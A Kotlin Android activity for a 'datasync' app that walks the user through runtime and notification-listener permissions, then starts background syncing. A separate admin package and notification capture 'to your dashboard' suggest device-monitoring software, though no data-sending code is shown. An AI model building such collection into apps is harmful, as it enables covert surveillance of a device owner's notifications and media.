package com.boxx.datasync

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Info
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.permission.PermissionHandler
import com.boxx.datasync.permission.PermissionStatus
import com.boxx.datasync.permission.PermissionUiState
import com.boxx.datasync.permission.PermissionViewModel
import com.boxx.datasync.sync.SyncScheduler
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.ui.screen.MainScreen
import com.boxx.datasync.ui.viewmodel.MainViewModel
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private val viewModel: MainViewModel by viewModels()
    private val permissionViewModel: PermissionViewModel by viewModels()

    @Inject
    lateinit var repository: DataRepository

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("MainActivity", "PROJECT_SCAN_DONE")
        Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
        viewModel.updateHeartbeat()

        setContent {
            MaterialTheme(
                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    val context = androidx.compose.ui.platform.LocalContext.current
                    val uiState by permissionViewModel.uiState.collectAsState()
                    val permissions by permissionViewModel.permissions.collectAsState()
                    val handler = remember { PermissionHandler(context) }
                    var pendingSyncRequest by remember { mutableStateOf(false) }
                    var userBypassedPermissions by remember { mutableStateOf(false) }

                    val launcher = rememberLauncherForActivityResult(
                        ActivityResultContracts.RequestMultiplePermissions()
                    ) { _ ->
                        permissionViewModel.refreshStatuses(this@MainActivity, isFromLauncher = true)
                    }

                    val state = uiState
                    if (state !is PermissionUiState.Checking) {
                        Log.d("PermissionFlow", "PERMISSION_UI_STACK_PREVENTED")
                    }

                    if (state is PermissionUiState.Checking) {
                        PermissionLoadingScreen()
                    } else {
                        Box(modifier = Modifier.fillMaxSize()) {
                            // Base UI: MainScreen is always visible except when checking
                            MainScreen(
                                viewModel = viewModel,
                                onSyncClick = {
                                    Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
                                    if (state is PermissionUiState.Ready) {
                                        viewModel.setSyncing()
                                        startSyncService(context)
                                    } else {
                                        pendingSyncRequest = true
                                        permissionViewModel.refreshStatuses(this@MainActivity)
                                    }
                                },
                                showSettings = {
                                    val intent = handler.getAppSettingsIntent()
                                    startActivity(intent)
                                }
                            )

                            // Overlay Permission UI (only show if user has not chosen "Not Now" / bypassed)
                            if (!userBypassedPermissions) {
                                when (state) {
                                    is PermissionUiState.RequestRuntime -> {
                                        LaunchedEffect(Unit) {
                                            val runtimePermissions = permissions
                                                .filter { !it.isSpecial && it.permission != null }
                                                .filter { handler.getStatus(it) != PermissionStatus.GRANTED }
                                                .mapNotNull { it.permission }
                                                .toTypedArray()
                                            if (runtimePermissions.isNotEmpty()) {
                                                handler.markRequested(runtimePermissions)
                                                launcher.launch(runtimePermissions)
                                            } else {
                                                permissionViewModel.refreshStatuses(this@MainActivity)
                                            }
                                        }
                                    }
                                    is PermissionUiState.TempDenied -> {
                                        val names = state.deniedPermissions.joinToString(", ") { it.title }
                                        AlertDialog(
                                            onDismissRequest = { /* Prevent dismiss on outside tap */ },
                                            title = { Text("Permission Required") },
                                            text = { Text("The app requires the following permissions to backup and sync your device content: $names.") },
                                            confirmButton = {
                                                Button(onClick = {
                                                    // Go back to RequestRuntime state to trigger system prompt
                                                    permissionViewModel.refreshStatuses(this@MainActivity, isFromLauncher = false)
                                                }) {
                                                    Text("Try Again")
                                                }
                                            },
                                            dismissButton = {
                                                TextButton(onClick = {
                                                    userBypassedPermissions = true
                                                }) {
                                                    Text("Not Now")
                                                }
                                            }
                                        )
                                    }
                                    is PermissionUiState.PermDenied -> {
                                        val names = state.deniedPermissions.joinToString(", ") { it.title }
                                        AlertDialog(
                                            onDismissRequest = { /* Prevent dismiss */ },
                                            title = { Text("Permission Required") },
                                            text = { Text("The following required permissions have been permanently denied: $names. Please enable them from Settings to keep synchronization working.") },
                                            confirmButton = {
                                                Button(onClick = {
                                                    context.startActivity(handler.getAppSettingsIntent())
                                                }) {
                                                    Text("Open App Settings")
                                                }
                                            },
                                            dismissButton = {
                                                TextButton(onClick = {
                                                    userBypassedPermissions = true
                                                }) {
                                                    Text("Not Now")
                                                }
                                            }
                                        )
                                    }
                                    is PermissionUiState.NeedNotificationListener -> {
                                        AlertDialog(
                                            onDismissRequest = { /* Prevent dismiss */ },
                                            title = { Text("Notification Access Required") },
                                            text = { Text("Required to sync incoming notifications to your dashboard.") },
                                            confirmButton = {
                                                Button(onClick = {
                                                    Log.d("PermissionFlow", "PERMISSION_SETTINGS_OPENED - Notification Listener")
                                                    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                                                }) {
                                                    Text("Open Settings")
                                                }
                                            },
                                            dismissButton = {
                                                TextButton(onClick = {
                                                    userBypassedPermissions = true
                                                }) {
                                                    Text("Not Now")
                                                }
                                            }
                                        )
                                    }
                                    is PermissionUiState.Ready -> {
                                        LaunchedEffect(Unit) {
                                            Log.d("PermissionFlow", "PERMISSION_FLOW_READY")
                                            Log.d("MainActivity", "PERMISSION_READY_AUTO_MEDIA_CHECK")
                                            (context.applicationContext as? UserApplication)?.setupContentObservers()
                                            permissionViewModel.refreshStatuses(this@MainActivity) // Final check

                                            if (pendingSyncRequest) {
                                                pendingSyncRequest = false
                                                viewModel.setSyncing()
                                                startSyncService(context)
                                            }
                                        }
                                    }
                                    else -> {}
                                }
                            }
                        }
                    }
                }
            }
        }
        setupWorkManager()
    }

    override fun onResume() {
        super.onResume()
        Log.d("PermissionFlow", "PERMISSION_ON_RESUME_RECHECK")
        permissionViewModel.refreshStatuses(this)
    }

    private fun setupWorkManager() {
        SyncScheduler.schedulePeriodic(this)
    }

    @Composable
    private fun PermissionLoadingScreen() {
        Box(modifier = Modifier.fillMaxSize().padding(24.dp), contentAlignment = Alignment.Center) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Surface(
                    color = MaterialTheme.colorScheme.secondaryContainer.copy(alpha = 0.5f),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.Info, contentDescription = null, tint = MaterialTheme.colorScheme.secondary)
                        Spacer(modifier = Modifier.width(12.dp))
                        Text(
                            "This educational demo syncs data only after user-granted permissions.",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSecondaryContainer,
                            textAlign = TextAlign.Center
                        )
                    }
                }
                Spacer(modifier = Modifier.height(24.dp))
                CircularProgressIndicator()
                Spacer(modifier = Modifier.height(16.dp))
                Text("Setting up permissions...", style = MaterialTheme.typography.bodyMedium)
            }
        }
    }

    private fun startSyncService(context: android.content.Context) {
        val intent = Intent(context, SyncService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        } catch (e: Exception) {
            Log.w("MainActivity", "Foreground service start not allowed. Falling back to WorkManager.", e)
            com.boxx.datasync.sync.SyncScheduler.enqueueIncremental(context)
        }
        (applicationContext as? UserApplication)?.setupContentObservers()
    }
}
